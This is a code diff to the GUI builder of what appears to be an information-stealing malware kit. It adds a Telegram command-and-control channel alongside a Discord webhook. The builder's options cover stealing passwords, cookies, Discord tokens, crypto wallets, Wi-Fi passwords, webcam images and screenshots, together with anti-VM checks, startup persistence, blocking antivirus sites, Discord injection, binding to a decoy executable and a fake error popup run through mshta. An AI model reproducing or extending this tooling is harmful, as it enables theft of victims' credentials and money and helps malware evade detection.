@@ -14,9 +14,11 @@ from pkg_resources import parse_version
 from socket import create_connection
 from tkinter import messagebox
 from urllib.request import urlopen, Request
+from urllib.parse import quote
 from PIL import Image
 from io import BytesIO
 from configparser import ConfigParser
+from threading import Thread
 
 class Utility:
 
@@ -139,7 +141,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		self.font = ctk.CTkFont(size= 20)
 
-		self.webhookVar = ctk.StringVar(self)
 		self.pingMeVar = ctk.BooleanVar(self)
 		self.vmProtectVar = ctk.BooleanVar(self)
 		self.startupVar = ctk.BooleanVar(self)
@@ -165,112 +166,148 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		self.OutputAsExe = True
 		self.ConsoleMode = 0 # 0 = None, 1 = Force, 2 = Debug
+		self.C2Mode = 0 # 0 = Discord, 1 = Telegram
 
-		for i in range(6):
+		for i in range(7): # Set 7 rows
 			self.rowconfigure(i, weight= 1)
 		
-		for i in range(6):
+		for i in range(6): # Set 6 columns
 			self.columnconfigure(i, weight= 1)
 
-		webhookEntry = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, textvariable= self.webhookVar)
-		webhookEntry.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)
+		# Controls
 
-		testWebhookButton = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", command= self.testWebhookButton_Callback)
-		testWebhookButton.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
+		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Webhook Here", height= 38, font= self.font, text_color= "white")
+		self.C2EntryControl.grid(row= 0, column= 0, sticky= "ew", padx= (15, 5), columnspan= 5)
+
+		self.testC2ButtonControl = ctk.CTkButton(self, text= "Test Webhook", height= 38, font= self.font, fg_color= "#454545", hover_color= "#4D4D4D", text_color_disabled= "grey", command= lambda: Thread(target= self.testC2ButtonControl_Callback).start())
+		self.testC2ButtonControl.grid(row= 0, column= 5, sticky= "ew", padx = (5, 15))
 		
-		pingMeCheckbox = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.pingMeVar)
-		pingMeCheckbox.grid(row= 1, column= 0, sticky= "w", padx= 20)
+		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.pingMeVar)
+		self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 20)
 
-		vmProtect = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.vmProtectVar)
-		vmProtect.grid(row= 2, column= 0, sticky= "w", padx= 20)
+		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.vmProtectVar)
+		self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 20)
 
-		startup = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.startupVar)
-		startup.grid(row= 3, column= 0, sticky= "w", padx= 20)
+		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.startupVar)
+		self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 20)
 
-		melt = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.meltVar)
-		melt.grid(row= 4, column= 0, sticky= "w", padx= 20)
+		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.meltVar)
+		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)
 
-		captureWebcam = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWebcamVar)
-		captureWebcam.grid(row= 1, column= 1, sticky= "w", padx= 20)
+		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWebcamVar)
+		self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 20)
 
-		capturePasswords = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.capturePasswordsVar)
-		capturePasswords.grid(row= 2, column= 1, sticky= "w", padx= 20)
+		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.capturePasswordsVar)
+		self.capturePasswordsCheckboxControl.grid(row= 2, column= 1, sticky= "w", padx= 20)
 
-		captureCookies = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureCookiesVar)
-		captureCookies.grid(row= 3, column= 1, sticky= "w", padx= 20)
+		self.captureCookiesCheckboxControl = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCookiesVar)
+		self.captureCookiesCheckboxControl.grid(row= 3, column= 1, sticky= "w", padx= 20)
 
-		captureHistory = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureHistoryVar)
-		captureHistory.grid(row= 4, column= 1, sticky= "w", padx= 20)
+		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureHistoryVar)
+		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)
 
-		captureDiscordTokens = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureDiscordTokensVar)
-		captureDiscordTokens.grid(row= 1, column= 2, sticky= "w", padx= 20)
+		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
+		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)
 
-		captureGames = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureGamesVar)
-		captureGames.grid(row= 2, column= 2, sticky= "w", padx= 20)
+		self.captureGamesCheckboxControl = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureGamesVar)
+		self.captureGamesCheckboxControl.grid(row= 2, column= 2, sticky= "w", padx= 20)
 
-		captureWallets = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWalletsVar)
-		captureWallets.grid(row= 3, column= 2, sticky= "w", padx= 20)
+		self.captureWalletsCheckboxControl = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWalletsVar)
+		self.captureWalletsCheckboxControl.grid(row= 3, column= 2, sticky= "w", padx= 20)
 
-		captureWifiPasswords = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWifiPasswordsVar)
-		captureWifiPasswords.grid(row= 4, column= 2, sticky= "w", padx= 20)
+		self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureWifiPasswordsVar)
+		self.captureWifiPasswordsCheckboxControl.grid(row= 4, column= 2, sticky= "w", padx= 20)
 
-		captureSysteminfo = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureSystemInfoVar)
-		captureSysteminfo.grid(row= 1, column= 3, sticky= "w", padx= 20)
+		self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureSystemInfoVar)
+		self.captureSysteminfoCheckboxControl.grid(row= 1, column= 3, sticky= "w", padx= 20)
 
-		captureScreenshot = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureScreenshotVar)
-		captureScreenshot.grid(row= 2, column= 3, sticky= "w", padx= 20)
+		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureScreenshotVar)
+		self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 20)
 
-		captureTelegram = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureTelegramVar)
-		captureTelegram.grid(row= 3, column= 3, sticky= "w", padx= 20)
+		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureTelegramVar)
+		self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 20)
 
-		fakeError = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", command= self.fakeError_Event, variable= self.fakeErrorVar)
-		fakeError.grid(row= 1, column= 4, sticky= "w", padx= 20)
+		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
+		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)
 
-		blockAvSites = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.blockAvSitesVar)
-		blockAvSites.grid(row= 2, column= 4, sticky= "w", padx= 20)
+		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.blockAvSitesVar)
+		self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 20)
 
-		discordInjection = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", variable= self.discordInjectionVar)
-		discordInjection.grid(row= 3, column= 4, sticky= "w", padx= 20)
+		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", variable= self.discordInjectionVar)
+		self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 20)
 
-		bindExeButton = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.bindExeButton_Callback(bindExeButton))
-		bindExeButton.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))
+		self.C2ModeButtonControl = ctk.CTkButton(self, text= "C2: Discord", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.C2ModeButtonControl_Callback)
+		self.C2ModeButtonControl.grid(row= 1, column= 5, sticky= "ew", padx= (0, 15))
 
-		selectIconButton = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.selectIconButton_Callback(selectIconButton))
-		selectIconButton.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))
+		self.bindExeButtonControl = ctk.CTkButton(self, text= "Bind Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.bindExeButtonControl_Callback)
+		self.bindExeButtonControl.grid(row= 2, column= 5, sticky= "ew", padx= (0, 15))
 
-		buildModeButton = ctk.CTkButton(self, text= "Output: Executable", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.buildModeButton_Callback(buildModeButton))
-		buildModeButton.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
+		self.selectIconButtonControl = ctk.CTkButton(self, text= "Select Icon", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.selectIconButtonControl_Callback)
+		self.selectIconButtonControl.grid(row= 3, column= 5, sticky= "ew", padx= (0, 15))
 
-		consoleModeButton = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", command= lambda: self.consoleModeButton_Callback(consoleModeButton))
-		consoleModeButton.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
+		self.buildModeButtonControl = ctk.CTkButton(self, text= "Output: EXE File", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.buildModeButtonControl_Callback)
+		self.buildModeButtonControl.grid(row= 4, column= 5, sticky= "ew", padx= (0, 15))
 
-		buildButton = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", command= self.buildButton_Callback)
-		buildButton.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
+		self.consoleModeButtonControl = ctk.CTkButton(self, text= "Console: None", height= 38, font= self.font, fg_color= "#393646", hover_color= "#6D5D6E", text_color_disabled= "grey", command= self.consoleModeButtonControl_Callback)
+		self.consoleModeButtonControl.grid(row= 5, column= 5, sticky= "ew", padx= (0, 15))
+
+		self.buildButtonControl = ctk.CTkButton(self, text= "Build", height= 38, font= self.font, fg_color= "#1E5128", hover_color= "#4E9F3D", text_color_disabled= "grey", command= self.buildButtonControl_Callback)
+		self.buildButtonControl.grid(row= 6, column= 5, sticky= "ew", padx= (0, 15))
+
+	def C2ModeButtonControl_Callback(self) -> None:
+		DISCORD = "C2: Discord"
+		TELEGRAM = "C2: Telegram"
+
+		checkBoxes = (
+			(self.pingMeCheckboxControl, self.pingMeVar),
+			(self.discordInjectionCheckboxControl, self.discordInjectionVar)
+		)
+
+		if self.C2Mode == 0: # Change to Telegram
+			self.C2Mode = 1
+			buttonText = TELEGRAM
+			self.C2EntryControl.configure(placeholder_text= "Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]")
+			self.testC2ButtonControl.configure(text= "Test Endpoint")
+
+			for control, var in checkBoxes:
+				control.configure(state= "disabled")
+				var.set(False)
+
+		elif self.C2Mode == 1: # Change to Discord
+			self.C2Mode = 0
+			buttonText = DISCORD
+			self.C2EntryControl.configure(placeholder_text= "Enter Discord Webhook URL")
+			self.testC2ButtonControl.configure(text= "Test Webhook")
+
+			for control, _ in checkBoxes:
+				control.configure(state= "normal")
+
+		self.C2ModeButtonControl.configure(text= buttonText)
 	
-	def bindExeButton_Callback(self, button: ctk.CTkButton) -> None:
-		ENABLED = "Unbind Executable"
-		DISABLED = "Bind Executable"
+	def bindExeButtonControl_Callback(self) -> None:
+		UNBIND = "Unbind Executable"
+		BIND = "Bind Executable"
 
-		buttonText = button.cget("text")
+		buttonText = self.bindExeButtonControl.cget("text")
 
-		if buttonText == DISABLED:
+		if buttonText == BIND:
 			allowedFiletypes = (("Executable file", "*.exe"),)
 			filePath = ctk.filedialog.askopenfilename(title= "Select file to bind", initialdir= ".", filetypes= allowedFiletypes)
 			if os.path.isfile(filePath):
 				self.boundExePath = filePath
-				button.configure(text= ENABLED)
+				self.bindExeButtonControl.configure(text= UNBIND)
 		
-		elif buttonText == ENABLED:
+		elif buttonText == UNBIND:
 			self.boundExePath = ""
-			button.configure(text= DISABLED)
+			self.bindExeButtonControl.configure(text= BIND)
 	
-	def selectIconButton_Callback(self, button: ctk.CTkButton) -> None:
-		ENABLED = "Unselect Icon"
-		DISABLED = "Select Icon"
+	def selectIconButtonControl_Callback(self) -> None:
+		UNSELECT = "Unselect Icon"
+		SELECT = "Select Icon"
 
-		buttonText = button.cget("text")
+		buttonText = self.selectIconButtonControl.cget("text")
 
-		if buttonText == DISABLED:
+		if buttonText == SELECT:
 			allowedFiletypes = (("Image", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"]), ("Any file", "*"))
 			filePath = ctk.filedialog.askopenfilename(title= "Select icon", initialdir= ".", filetypes= allowedFiletypes)
 			if os.path.isfile(filePath):
@@ -283,21 +320,50 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				except Exception:
 					messagebox.showerror("Error", "Unable to convert the image to icon!")
 				else:
-					button.configure(text= ENABLED)
+					self.selectIconButtonControl.configure(text= UNSELECT)
 		
-		elif buttonText == ENABLED:
+		elif buttonText == UNSELECT:
 			self.iconBytes = b""
-			button.configure(text= DISABLED)
+			self.selectIconButtonControl.configure(text= SELECT)
 	
-	def buildModeButton_Callback(self, button: ctk.CTkButton) -> None:
-		EXEMODE = "Output: Executable"
-		PYMODE = "Output: Python Script"
+	def buildModeButtonControl_Callback(self) -> None:
+		EXEMODE = "Output: EXE File"
+		PYMODE = "Output:   PY File"
 
-		self.OutputAsExe = not self.OutputAsExe
+		checkBoxControls = (
+			(self.captureWebcamCheckboxControl, self.captureWebcamVar),
+			(self.fakeErrorCheckboxControl, self.fakeErrorVar),
+			(self.startupCheckboxControl, self.startupVar),
+			(self.bindExeButtonControl, None),
+			(self.selectIconButtonControl, None),
+		)
 
-		button.configure(text= EXEMODE if self.OutputAsExe else PYMODE)
+		if self.OutputAsExe: # Change to PY mode
+			self.OutputAsExe = False
+			buttonText = PYMODE
+
+			for control, var in checkBoxControls:
+				control.configure(state= "disabled")
+				if var:
+					var.set(False)
+			self.fakeError_Event()
+			
+			if self.iconBytes:
+				self.selectIconButtonControl_Callback() # Remove icon
+			
+			if self.boundExePath:
+				self.bindExeButtonControl_Callback() # Remove bound executable
+
+		else: # Change to EXE mode
+			self.OutputAsExe = True
+			buttonText = EXEMODE
+
+			for control, _ in checkBoxControls:
+				control.configure(state= "normal")
+
+		self.buildModeButtonControl.configure(text= buttonText)
 	
-	def consoleModeButton_Callback(self, button: ctk.CTkButton) -> None:
+	def consoleModeButtonControl_Callback(self) -> None:
 		CONSOLE_NONE = "Console: None"
 		CONSOLE_FORCE = "Console: Force"
 		CONSOLE_DEBUG = "Console: Debug"
@@ -312,31 +378,46 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.ConsoleMode = 0
 			buttonText = CONSOLE_NONE
 
-		button.configure(text= buttonText)
+		self.consoleModeButtonControl.configure(text= buttonText)
 	
-	def buildButton_Callback(self) -> None:
-		webhook = self.webhookVar.get().strip()
+	def buildButtonControl_Callback(self) -> None:
+		if self.C2Mode == 0:
+			webhook = self.C2EntryControl.get().strip()
+			if len(webhook) == 0:
+				messagebox.showerror("Error", "Webhook cannot be empty!")
+				return
+			
+			if not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
+				messagebox.showerror("Error", "Invalid webhook!")
+				return
+		
+		elif self.C2Mode == 1:
+			endpoint = self.C2EntryControl.get().strip()
+			if len(endpoint) == 0:
+				messagebox.showerror("Error", "Endpoint cannot be empty!")
+				return
+			
+			if not endpoint.count("$") == 1 or any(char.isspace() for char in endpoint):
+				messagebox.showerror("Error", "Invalid endpoint!")
+				return
+			
+			token, chat_id = [i.strip() for i in endpoint.split("$")]
 
-		if len(webhook) == 0:
-			messagebox.showerror("Error", "Webhook cannot be empty!")
-			return
+			if not token or not chat_id:
+				messagebox.showerror("Warning", "Invalid endpoint!")
+				return
 		
-		elif not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
-			messagebox.showerror("Error", "Invalid Webhook!")
-			return
-		
-		
-		elif not Utility.CheckInternetConnection():
+		if not Utility.CheckInternetConnection():
 			messagebox.showwarning("Warning", "Unable to connect to the internet!")
 			return
 		
-		elif not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get()):
+		if not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get()):
 			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
 			return
 		
 		config= {
     		"settings" : {
-        		"webhook" : webhook,
+        		"c2" : [self.C2Mode, self.C2EntryControl.get().strip()],
         		"pingme" : self.pingMeVar.get(),
         		"vmprotect" : self.vmProtectVar.get(),
         		"startup" : self.startupVar.get(),
@@ -370,38 +451,77 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		if self.OutputAsExe:
 			self.master.BuildExecutable(configData, self.iconBytes, self.boundExePath)
 		else:
-			self.master.BuildPythonFile(configData, self.iconBytes, self.boundExePath)
+			self.master.BuildPythonFile(configData)
 			
-	def testWebhookButton_Callback(self) -> None:
-		webhook = self.webhookVar.get().strip()
-		if len(webhook) == 0:
-			messagebox.showerror("Error", "Webhook cannot be empty!")
-			return
-		
-		if not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
-			messagebox.showerror("Error", "Invalid Webhook!")
-			return
-		
-		elif not "discord" in webhook:
-			messagebox.showwarning("Warning", "Webhook does not seems to be a discord webhook!")
-			return
-		
-		elif not Utility.CheckInternetConnection():
-			messagebox.showwarning("Warning", "Unable to connect to the internet!")
-			return
-		
-		data = json.dumps({"content" : "Your webhook is working!"})
+	def testC2ButtonControl_Callback(self) -> None:
+		self.C2EntryControl.configure(state= "disabled")
+		self.C2ModeButtonControl.configure(state= "disabled")
+		self.buildButtonControl.configure(state= "disabled")
 
-		req = Request(url= webhook, method= "POST", data= data.encode(), headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
+		def check():
+			if self.C2Mode == 0:
+				webhook = self.C2EntryControl.get().strip()
+				if len(webhook) == 0:
+					messagebox.showerror("Error", "Webhook cannot be empty!")
+					return
+				
+				if not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
+					messagebox.showerror("Error", "Invalid webhook!")
+					return
+				
+				elif not "discord" in webhook:
+					messagebox.showwarning("Warning", "Webhook does not seems to be a Discord webhook!")
+					return
+				
+				elif not Utility.CheckInternetConnection():
+					messagebox.showwarning("Warning", "Unable to connect to the internet!")
+					return
+				
+				data = json.dumps({"content" : "Your webhook is working!"})
 
-		try:
-			status = urlopen(req).status
-			if status == 204:
-				messagebox.showinfo("Success", "Your webhook seems to be working!")
-			else:
-				raise Exception()
-		except Exception:
-			messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
+				req = Request(url= webhook, method= "POST", data= data.encode(), headers= {"Content-Type" : "application/json", "user-agent" : "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
+
+				try:
+					status = urlopen(req).status
+					if status == 204:
+						messagebox.showinfo("Success", "Your webhook seems to be working!")
+					else:
+						raise Exception()
+				except Exception:
+					messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
+			
+			if self.C2Mode == 1:
+				endpoint = self.C2EntryControl.get().strip()
+				if len(endpoint) == 0:
+					messagebox.showerror("Error", "Endpoint cannot be empty!")
+					return
+				
+				if not endpoint.count("$") == 1 or any(char.isspace() for char in endpoint):
+					messagebox.showerror("Error", "Invalid endpoint!")
+					return
+				
+				token, chat_id = [i.strip() for i in endpoint.split("$")]
+
+				if not token or not chat_id:
+					messagebox.showerror("Warning", "Invalid endpoint!")
+					return
+				
+				if not Utility.CheckInternetConnection():
+					messagebox.showwarning("Warning", "Unable to connect to the internet!")
+					return
+				
+				try:
+					if urlopen("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is working!"))).status == 200:
+						messagebox.showinfo("Success", "Your endpoint seems to be working!")
+						return
+				except Exception:
+					messagebox.showwarning("Warning", "Your endpoint does not seems to be working!")
+					return
+		
+		check()
+		self.buildButtonControl.configure(state= "normal")
+		self.C2ModeButtonControl.configure(state= "normal")
+		self.C2EntryControl.configure(state= "normal")
 	
 	def fakeError_Event(self) -> None:
 		if not self.fakeErrorVar.get():
@@ -428,7 +548,8 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 		self.rowconfigure(4, weight= 1)
 		self.rowconfigure(5, weight= 1)
 		self.rowconfigure(6, weight= 1)
-		self.rowconfigure(7, weight= 2)
+		self.rowconfigure(7, weight= 1)
+		self.rowconfigure(8, weight= 2)
 
 		self.columnconfigure(1, weight= 1)
 
@@ -441,22 +562,22 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 		self.messageEntry.grid(row = 1, column= 1, padx= 20, sticky= "ew", columnspan= 2)
 
 		self.iconChoiceSt = ctk.CTkRadioButton(self, text= "Stop", value= 0, variable= self.iconVar, font= ctk.CTkFont(size= 20))
-		self.iconChoiceSt.grid(row= 3, column= 1, sticky= "w", padx= 20)
+		self.iconChoiceSt.grid(row= 4, column= 1, sticky= "w", padx= 20)
 
 		self.iconChoiceQn = ctk.CTkRadioButton(self, text= "Question", value= 16, variable= self.iconVar, font= ctk.CTkFont(size= 20))
-		self.iconChoiceQn.grid(row= 4, column= 1, sticky= "w", padx= 20)
+		self.iconChoiceQn.grid(row= 5, column= 1, sticky= "w", padx= 20)
 
 		self.iconChoiceWa = ctk.CTkRadioButton(self, text= "Warning", value= 32, variable= self.iconVar, font= ctk.CTkFont(size= 20))
-		self.iconChoiceWa.grid(row= 5, column= 1, sticky= "w", padx= 20)
+		self.iconChoiceWa.grid(row= 6, column= 1, sticky= "w", padx= 20)
 
 		self.iconChoiceIn = ctk.CTkRadioButton(self, text= "Information", value= 48, variable= self.iconVar, font= ctk.CTkFont(size= 20))
-		self.iconChoiceIn.grid(row= 6, column= 1, sticky= "w", padx= 20)
+		self.iconChoiceIn.grid(row= 7, column= 1, sticky= "w", padx= 20)
 
 		self.testButton = ctk.CTkButton(self, text= "Test", height= 28, font= ctk.CTkFont(size= 20), fg_color= "#393646", hover_color= "#6D5D6E", command= self.testFakeError)
-		self.testButton.grid(row= 3, column= 2, padx= 20)
+		self.testButton.grid(row= 4, column= 2, padx= 20)
 
 		self.saveButton = ctk.CTkButton(self, text= "Save", height= 28, font= ctk.CTkFont(size= 20), fg_color= "#393646", hover_color= "#6D5D6E", command= self.saveFakeError)
-		self.saveButton.grid(row= 4, column= 2, padx= 20)
+		self.saveButton.grid(row= 5, column= 2, padx= 20)
 	
 	def testFakeError(self) -> None:
 		title= self.titleEntry.get()
@@ -472,7 +593,7 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 			self.messageEntry.insert(0, message)
 		
 		cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, icon)
-		subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+		subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
 	
 	def saveFakeError(self) -> None:
 		title= self.titleEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")
@@ -520,30 +641,8 @@ class Builder(ctk.CTk):
 		self.builderOptions = BuilderOptionsFrame(self)
 		self.builderOptions.grid(row= 1, column= 0, sticky= "nsew")
 	
-	def BuildPythonFile(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
-		options: dict = json.loads(config)
-		excludeList = []
-
-		if options["modules"]["fakeError"][0]:
-			excludeList.append("Fake Error")
-		
-		if options["modules"]["captureWebcam"]:
-			excludeList.append("Capture Webcam")
-		
-		if options["settings"]["startup"]:
-			excludeList.append("Put On Startup")
-		
-		if iconFileBytes:
-			excludeList.append("Icon")
-		
-		if boundFilePath:
-			excludeList.append("Bind Executable")
-		
-		if excludeList:
-			message = "You are exporting the stub as a Python script. The following features will not work if you continue:\n\n" + "\n".join(["%d) %s" % (n+1, x) for n, x in enumerate(excludeList)]) + "\n\nDo you still want to continue?"
-			if not messagebox.askyesno("Confirmation", message):
-				return
-		
+	def BuildPythonFile(self, config: str) -> None:
+		options = json.loads(config)
 		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
